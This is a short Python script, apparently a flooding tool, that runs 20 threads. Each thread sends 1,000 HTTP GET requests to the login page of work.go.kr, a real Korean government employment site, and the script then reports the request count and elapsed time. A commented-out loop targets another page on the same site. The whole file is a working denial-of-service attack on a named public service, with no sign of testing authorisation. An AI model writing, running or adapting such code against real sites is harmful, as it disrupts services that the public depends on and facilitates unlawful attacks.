from selenium import webdriver
import requests
import os
import time
from threading import Thread

global cnt
cnt = 0

#timeout =5

def getflooding():
    global cnt
    for i in range(0, 1000):
        requests.get("https://www.work.go.kr/member/bodyLogin.do")
        print("asdf")
        cnt = cnt + 1

th1 = Thread(target=getflooding, args=())
th2 = Thread(target=getflooding, args=())
th3 = Thread(target=getflooding, args=())
th4 = Thread(target=getflooding, args=())
th5 = Thread(target=getflooding, args=())
th6 = Thread(target=getflooding, args=())
th7 = Thread(target=getflooding, args=())
th8 = Thread(target=getflooding, args=())
th9 = Thread(target=getflooding, args=())
th10 = Thread(target=getflooding, args=())
th11 = Thread(target=getflooding, args=())
th12 = Thread(target=getflooding, args=())
th13 = Thread(target=getflooding, args=())
th14 = Thread(target=getflooding, args=())
th15 = Thread(target=getflooding, args=())
th16 = Thread(target=getflooding, args=())
th17 = Thread(target=getflooding, args=())
th18 = Thread(target=getflooding, args=())
th19 = Thread(target=getflooding, args=())
th20 = Thread(target=getflooding, args=())


start = time.time()
th1.start()
th2.start()
th3.start()
th4.start()
th5.start()
th6.start()
th7.start()
th8.start()
th9.start()
th10.start()
th11.start()
th12.start()
th13.start()
th14.start()
th15.start()
th16.start()
th17.start()
th18.start()
th19.start()
th20.start()

th1.join()
th2.join()
th3.join()
th4.join()
th5.join()
th6.join()
th7.join()
th8.join()
th9.join()
th10.join()
th11.join()
th12.join()
th13.join()
th14.join()
th15.join()
th16.join()
th17.join()
th18.join()
th19.join()
th20.join()

print("횟수 = ", cnt)
print("시간 :", time.time() - start, "초")  # 현재시각 - 시작시간 = 실행 시간
os.system("pause")


'''
for i in range(0, 103):
    #print("gdgd")
    cnt = cnt + 1
    requests.get("https://www.work.go.kr/seekWantedMain.do")
    #print("응답값 = ", response.status_code)
'''
